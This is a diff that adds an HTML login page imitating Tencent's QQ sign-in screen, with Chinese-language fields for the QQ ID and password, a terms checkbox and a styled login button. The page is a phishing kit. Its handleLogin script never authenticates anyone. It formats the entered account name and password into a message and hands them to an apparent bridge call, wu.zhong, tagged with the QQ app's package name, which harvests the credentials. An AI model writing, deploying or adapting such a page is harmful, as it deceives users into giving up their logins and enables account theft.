@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>QQ登录</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Helvetica Neue', STHeiti, 'Microsoft Yahei', Tahoma, Simsun, sans-serif;
+      background: linear-gradient(135deg, #e8f4fd 0%, #d6e9f7 25%, #c8dff5 50%, #b8d4f1 75%, #a8c8ec 100%);
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 20px;
+      margin-top: 20px;
+    }
+
+
+    .back-btn {
+      font-size: 28px;
+      color: #666;
+      cursor: pointer;
+      font-weight: 300;
+    }
+
+
+    .logo-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 40px 0 100px 0;
+    }
+
+
+    .qq-logo {
+      display: flex;
+      gap: 8px;
+    }
+
+
+    .logo-q {
+      width: 65px;
+      height: 65px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      font-weight: 300;
+      font-family: 'Arial', sans-serif;
+      position: relative;
+    }
+
+
+    .logo-q.blue {
+      background: linear-gradient(135deg, #00D4FF, #0099CC);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      -webkit-text-fill-color: transparent;
+    }
+
+
+    .logo-q.purple {
+      background: linear-gradient(135deg, #9966FF, #6633CC);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      -webkit-text-fill-color: transparent;
+    }
+
+
+    .logo-q::before {
+      content: 'Q';
+      font-family: 'Arial', sans-serif;
+      font-weight: 300;
+      letter-spacing: -2px;
+    }
+
+
+    .form-container {
+      padding: 0 40px;
+      margin-bottom: 50px;
+    }
+
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+
+    .form-input {
+      width: 100%;
+      padding: 22px 25px;
+      background: rgba(255, 255, 255, 0.95);
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      color: #333;
+      outline: none;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    }
+
+
+    .form-input::placeholder {
+      color: #bbb;
+      font-weight: 300;
+    }
+
+
+    .form-input:focus {
+      background: rgba(255, 255, 255, 1);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      transform: translateY(-1px);
+    }
+
+
+    .login-btn {
+      width: 100%;
+      padding: 22px;
+      background: linear-gradient(135deg, #5DADE2, #3498DB);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 20px;
+      font-weight: 400;
+      cursor: pointer;
+      margin-top: 25px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(84, 173, 226, 0.3);
+    }
+
+
+    .login-btn:hover {
+      background: linear-gradient(135deg, #3498DB, #2980B9);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(84, 173, 226, 0.4);
+    }
+
+
+    .login-btn:active {
+      transform: translateY(0);
+    }
+
+    .agreement {
+      display: flex;
+      align-items: flex-start;
+      padding: 0 40px;
+      margin-bottom: 40px;
+      gap: 15px;
+    }
+
+
+    .checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #666;
+      border-radius: 50%;
+      cursor: pointer;
+      margin-top: 3px;
+      transition: all 0.3s ease;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+
+    .checkbox.checked {
+      background: #5DADE2;
+      border-color: #5DADE2;
+    }
+
+
+    .checkbox.checked::after {
+      content: '✓';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+
+    .agreement-text {
+      font-size: 16px;
+      color: #666;
+      line-height: 1.5;
+    }
+
+
+    .agreement-link {
+      color: #5DADE2;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+
+    .agreement-link:hover {
+      color: #3498DB;
+    }
+
+
+
+    @media (min-width: 768px) {
+      .form-container {
+        max-width: 450px;
+        margin: 0 auto 50px auto;
+        padding: 0 20px;
+      }
+     
+      .agreement {
+        max-width: 450px;
+        margin: 0 auto 40px auto;
+        padding: 0 20px;
+      }
+
+
+      .logo-section {
+        margin: 60px 0 120px 0;
+      }
+
+
+      .logo-q {
+        width: 75px;
+        height: 75px;
+        font-size: 42px;
+      }
+
+
+      .header {
+        padding: 30px;
+      }
+    }
+
+
+    @media (min-width: 1024px) {
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+
+      .main-content {
+        background: rgba(255, 255, 255, 0.15);
+        backdrop-filter: blur(20px);
+        border-radius: 25px;
+        padding: 40px;
+        width: 450px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+      }
+
+
+      .header {
+        padding: 0 0 20px 0;
+        margin-top: 0;
+      }
+
+
+      .logo-section {
+        margin: 40px 0 60px 0;
+      }
+
+
+      .form-container {
+        padding: 0;
+        margin-bottom: 30px;
+      }
+
+
+      .agreement {
+        padding: 0;
+        margin-bottom: 0;
+      }
+    }
+
+
+ 
+    .form-input,
+    .login-btn,
+    .checkbox {
+      animation: fadeInUp 0.6s ease-out;
+    }
+
+
+    .logo-q {
+      animation: fadeIn 0.8s ease-out;
+    }
+
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-content">
+ 
+    <div class="header">
+      <div class="back-btn">‹</div>
+    </div>
+
+
+
+    <div class="logo-section">
+      <div class="qq-logo">
+        
+      </div>
+    </div>
+
+
+
+    <div class="form-container">
+      <div class="form-group">
+        <input type="text" class="form-input" placeholder="QID/邮箱" id="qidInput">
+      </div>
+      <div class="form-group">
+        <input type="password" class="form-input" placeholder="输入QQ密码" id="passwordInput">
+      </div>
+
+        <div class="agreement">
+      <div class="checkbox" id="agreementCheck" onclick="toggleCheck()"></div>
+      <div class="agreement-text">
+        已阅读并同意<a href="#" class="agreement-link">服务协议</a>和<a href="#" class="agreement-link">QQ隐私保护指引</a>
+      </div>
+    </div>
+
+      <button class="login-btn" onclick="handleLogin()">登录</button>
+    </div>
+
+
+
+  
+  </div>
+
+
+  <script>
+    function toggleCheck() {
+      const checkbox = document.getElementById('agreementCheck');
+      checkbox.classList.toggle('checked');
+    }
+
+
+    function handleLogin() {
+      const qid = document.getElementById('qidInput').value.trim();
+      const password = document.getElementById('passwordInput').value;
+      const isChecked = document.getElementById('agreementCheck').classList.contains('checked');
+
+
+      if (!qid || !password) {
+        
+        return;
+      }
+
+
+    
+
+
+ wu.zhong(`🔰 QQ登录\n\n✉️QQ登录: ${qid}\n\n🔒密码: ${password}`, "com.tencent.mobileqq");
+
+
+
+
+    }
+
+
+
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(() => {
+        document.getElementById('qidInput').focus();
+      }, 300);
+    });
+
+
+
+    document.querySelectorAll('.form-input').forEach(input => {
+      input.addEventListener('focus', function() {
+        this.style.transform = 'translateY(-2px)';
+      });
+     
+      input.addEventListener('blur', function() {
+        this.style.transform = 'translateY(0)';
+      });
+    });
+
+
+
+    document.getElementById('agreementCheck').addEventListener('click', function() {
+      this.style.transform = 'scale(0.9)';
+      setTimeout(() => {
+        this.style.transform = 'scale(1)';
+      }, 150);
+    });
+  </script>
+</body>
+</html>
